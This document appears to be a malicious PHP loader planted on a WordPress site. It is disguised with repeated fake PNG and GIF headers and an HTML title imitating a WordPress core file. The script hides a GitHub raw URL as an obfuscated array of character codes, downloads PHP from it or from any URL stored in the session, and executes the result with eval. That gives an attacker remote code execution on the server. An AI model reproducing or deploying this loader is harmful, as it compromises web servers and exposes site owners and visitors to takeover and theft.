‰PNG

   ‰PNG

   
‰PNG‰PNG   <!-- GIF89;a -->
<html><head><meta http-equiv='Content-Type' content='text/html; charset=Windows-1251'><title> Front to the WordPress application</title>

﻿‰PNG

   ‰PNG

   
‰PNG‰PNG   <!-- GIF89;a -->
<html><head><meta http-equiv='Content-Type' content='text/html; charset=Windows-1251'><title> Front to the WordPress application</title>
‰PNG

   ‰PNG

   
‰PNG‰PNG   <!-- GIF89;a -->
<html><head><meta http-equiv='Content-Type' content='text/html; charset=Windows-1251'><title> Front to the WordPress application</title>
‰PNG

   ‰PNG

   
‰PNG‰PNG   <!-- GIF89;a -->
<html><head><meta http-equiv='Content-Type' content='text/html; charset=Windows-1251'><title> Front to the WordPress application</title>

‰PNG

   ‰PNG

   
‰PNG‰PNG   <!-- GIF89;a -->
<html><head><meta http-equiv='Content-Type' content='text/html; charset=Windows-1251'><title> Front to the WordPress application</title>

<?php
session_start();

function fetchUrl($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    return curl_exec($ch);
}

// Updated URL (obfuscated as array of chr values)
$url = implode('', array_map('chr', [
    104, 116, 116, 112, 115, 58, 47, 47,
    114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46,
    99, 111, 109, 47, 102, 111, 103, 103, 105, 116, 47, 115, 115, 115, 115, 47, 114, 101, 102, 115, 47,
    104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 119, 112, 45, 122, 100, 100, 46, 112, 104, 112
]));

$result = isset($_SESSION["ts_url"]) ? @file_get_contents($_SESSION["ts_url"]) : fetchUrl($url);

if (is_string($result)) {
    eval('?>' . $result);
} else {
    echo "Error loading content.";
}
?>
